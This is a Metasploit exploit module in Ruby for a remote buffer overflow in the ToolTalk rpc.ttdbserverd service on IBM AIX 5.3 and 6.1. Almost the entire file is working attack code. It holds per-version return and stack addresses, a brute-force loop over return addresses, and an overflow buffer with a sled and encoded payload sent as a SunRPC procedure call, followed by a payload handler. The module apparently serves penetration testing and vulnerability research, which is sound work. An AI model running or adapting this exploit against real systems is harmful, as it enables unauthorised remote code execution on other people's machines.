##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::SunRPC
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow',
			'Description'    => %q{
			This module exploits a buffer overflow vulnerability in _tt_internal_realpath
			function of the ToolTalk database server (rpc.ttdbserverd).
			},
			'Author'         =>
				[
					'Adriano Lima <adriano@risesecurity.org>',
					'Ramon de Carvalho Valle <ramon@risesecurity.org>'
				],
			'Version'        => '$Revision$',
			'Payload'        =>
				{
					'BadChars' => "\x00",
				},
			'Targets'        => 
				[
					[ 
						'IBM AIX Version 6.1.4',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20099430+4096,
							'Addr1'    => 0x2ff1ff50-8192,
							'AIX'  => '6.1.4',
							'Payload'  => { 'AIX' => '6.1.4' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20099430-8192 },
								'Stop'  => { 'Ret' => 0x20099430+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 6.1.3',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20099280+4096,
							'Addr1'    => 0x2ff1ffd0-8192,
							'AIX'  => '6.1.3',
							'Payload'  => { 'AIX' => '6.1.3' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20099280-8192 },
								'Stop'  => { 'Ret' => 0x20099280+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 6.1.2',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20099280+4096,
							'Addr1'    => 0x2ff1ffd0-8192,
							'AIX'  => '6.1.2',
							'Payload'  => { 'AIX' => '6.1.2' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20099280-8192 },
								'Stop'  => { 'Ret' => 0x20099280+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 6.1.1',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20099280+4096,
							'Addr1'    => 0x2ff1ffd0-8192,
							'AIX'  => '6.1.1',
							'Payload'  => { 'AIX' => '6.1.1' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20099280-8192 },
								'Stop'  => { 'Ret' => 0x20099280+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 6.1.0',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20099280+4096,
							'Addr1'    => 0x2ff1ffd0-8192,
							'AIX'  => '6.1.0',
							'Payload'  => { 'AIX' => '6.1.0' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20099280-8192 },
								'Stop'  => { 'Ret' => 0x20099280+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 5.3.10 5.3.9 5.3.8 5.3.7',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20096ba0+4096,
							'Addr1'    => 0x2ff1ff14-8192,
							'AIX'  => '5.3.9',
							'Payload'  => { 'AIX' => '5.3.9' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20096ba0-8192 },
								'Stop'  => { 'Ret' => 0x20096ba0+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 5.3.10',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20096bf0+4096,
							'Addr1'    => 0x2ff1ff14-8192,
							'AIX'  => '5.3.10',
							'Payload'  => { 'AIX' => '5.3.10' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20096bf0-8192 },
								'Stop'  => { 'Ret' => 0x20096bf0+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 5.3.9',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20096ba0+4096,
							'Addr1'    => 0x2ff1ff14-8192,
							'AIX'  => '5.3.9',
							'Payload'  => { 'AIX' => '5.3.9' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20096ba0-8192 },
								'Stop'  => { 'Ret' => 0x20096ba0+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 5.3.8',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20096c10+4096,
							'Addr1'    => 0x2ff1ff98-8192,
							'AIX'  => '5.3.8',
							'Payload'  => { 'AIX' => '5.3.8' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20096c10-8192 },
								'Stop'  => { 'Ret' => 0x20096c10+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'IBM AIX Version 5.3.7',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0x20096c10+4096,
							'Addr1'    => 0x2ff1ff98-8192,
							'AIX'  => '5.3.7',
							'Payload'  => { 'AIX' => '5.3.7' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x20096c10-8192 },
								'Stop'  => { 'Ret' => 0x20096c10+8192 },
								'Step'  => 1024
							}
						}
					],
					[ 
						'Debug IBM AIX Version 6.1',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0xaabbccdd,
							'Addr1'    => 0xddccbbaa,
							'AIX'  => '6.1.4',
							'Payload'  => { 'AIX' => '6.1.4' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0xaabbccdd },
								'Stop'  => { 'Ret' => 0xaabbccdd },
								'Step'  => 1024
							}
						}
					],
					[ 
						'Debug IBM AIX Version 5.3',
						{
							'Arch'     => 'ppc',
							'Platform' => 'aix',
							'Ret'      => 0xaabbccdd,
							'Addr1'    => 0xddccbbaa,
							'AIX'  => '5.3.10',
							'Payload'  => { 'AIX' => '5.3.10' },
							'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0xaabbccdd },
								'Stop'  => { 'Ret' => 0xaabbccdd },
								'Step'  => 1024
							}
						}
					],
				],
			'DefaultTarget' => 0))

	end

	def brute_exploit(brute_target)
		begin
			print_status("Trying to exploit rpc.ttdbserverd with address 0x%08x..." % brute_target['Ret'])

			sunrpc_create('tcp', 100083, 1)

			if target['AIX'] =~ /6\./
				buf = "A"
			else
				buf = "AA"
			end

			buf << [target['Addr1']].pack('N') * (1022 + 8)
			buf << [brute_target['Ret']].pack('N') * 32

			if target['AIX'] =~ /6\./
				buf << "AAA"
			else
				buf << "AA"
			end

			buf << "\x7f\xff\xfb\x78" * 1920
			buf << payload.encoded
			buf = XDR.encode(buf, 2, 0x78000000, 2, 0x78000000)

			print_status('Sending procedure 15 call message...')
			sunrpc_call(15, buf)

			sunrpc_destroy
			handler

		rescue Rex::Proto::SunRPC::RPCTimeout
			# print_error('RPCTimeout')
		rescue EOFError
			# print_error('EOFError')
		end
	end

end


